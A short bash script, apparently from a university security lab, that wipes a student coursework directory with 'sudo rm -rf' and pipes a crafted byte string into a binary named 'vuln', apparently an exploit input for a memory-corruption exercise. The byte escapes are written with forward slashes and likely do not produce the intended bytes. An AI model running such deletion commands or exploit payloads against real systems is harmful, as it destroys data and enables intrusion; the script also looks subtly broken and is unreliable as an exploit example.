#!/usr/bin/env bash
echo "Starting script" 
echo "Cleaning working environment"
echo "Enter 'student' for sudo access"
sudo rm -rf /home/student/cw3/*
null=$(echo '00' | sed 's/../\\x&/g')
echo -en "/x01/xe3/x02/xb2${null}${null}" | /task1/s1851664/vuln